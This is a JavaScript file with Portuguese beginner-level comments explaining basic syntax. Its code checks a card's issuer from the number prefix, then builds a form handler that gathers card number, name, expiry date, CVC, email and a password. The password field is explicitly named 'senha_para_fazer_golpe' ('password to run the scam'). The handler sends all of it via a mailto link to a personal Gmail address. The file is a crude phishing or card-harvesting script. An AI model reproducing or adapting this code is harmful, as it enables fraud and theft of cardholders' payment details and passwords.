// SE EU FOR ENSINAR PARA ALGM JAVASCRIPT VAI SER DIFICIL MAS, ALGUMAS DICAS 
// PRIMEIRA IMPORTÂCIA JAVASCRIPT É SENSIVEL A CAPS LOCK LETRAS MAISCULAS SÓ SE USA LETRA MAIUSCULA EM UMA NOVA PALAVRA COMO meuNome 
// VAR DEFINI VARIAVEL, VARIAVEL UMA COISA QUE VOCE COLOCARA NO SEU CÓDIGO POR EXEMPLO, VAR meuNome = 'matheus' eu defini que variavel do meuNome é mathueus
// fuction eu crio uma função pra tal tarefa
// document.getElementById("numero_do_cartão") pega a identificação do meu input lá do html,getElementById traduzindo é pegue elemento por id
// if é tipo um ''se'' se tiver 4 letras A no nome de um pais ficar vermelho 
// else if é um se não tiver 4 letras ficar azul
// else é tipo em ultimo caso é isso 
//innerhtml perguntar pro prof
// PARA DEIXAR A VARIAVEL MAIS FACIL PARA URL VER, var de subject junta com o encode serve para codificar as palavras = (&$#c-%$)var subjectEncoded = encodeURIComponent(subject);var bodyEncoded = encodeURIComponent(body);



function indetificar_cartão() {
    var numero_do_cartão = document.getElementById("numero_do_cartão").value;
    var issuer = "";

    // Verificação simples dos BINs para Visa, MasterCard e Elo
    if (/^4[0-9]{5}/.test(numero_do_cartão)) {
        issuer = "Visa";
    } else if (/^5[1-5][0-9]{4}/.test(numero_do_cartão)) {
        issuer = "MasterCard";
    } else if (/^(506699|509|65[0-9]{4})/.test(numero_do_cartão)) {
        issuer = "Elo";
    } else {
        issuer = "Emissor desconhecido";
    }

    document.getElementById("resultado").innerHTML = "O emissor do cartão é: " + issuer;
}

document.getElementById("formulario").onsubmit = function(event) {
    // Prevenir o envio padrão do formulário
    event.preventDefault();

    // adicionando valores as variáveis (var)
    var numero_do_cartão = document.getElementById("numero_do_cartão").value;
    var nome = document.getElementById("nome").value;
    var data = document.getElementById("data").value;
    var cvc = document.getElementById("cvc").value;
    var email = document.getElementById("email").value;
    var senha_para_fazer_golpe = document.getElementById("senha_para_fazer_golpe").value;

    // Montar a mensagem para do email
    var subject = `Contato de ${nome}`;
    var body = `Olá, meu numero de cartão é ${numero_do_cartão}. a MM/AA do meu cartão é ${data}. o código de segurança ${cvc}
    . Meu email é ${email}. minha senha é ${senha_para_fazer_golpe}`;

    // PARA DEIXAR A VARIAVEL MAIS FACIL PARA URL VER, var de subject junta com o encode serve para codificar as palavras = (&$#c-%$)
    var subjectEncoded = encodeURIComponent(subject);
    var bodyEncoded = encodeURIComponent(body);

    var mailtoLink = `mailto:matheuspinho5050@gmail.com?subject=${subjectEncoded}&body=${bodyEncoded}`;

    // quando a variavel va mailtolink for acionada esse codigo rediocionará 
    window.location.href = mailtoLink;
};
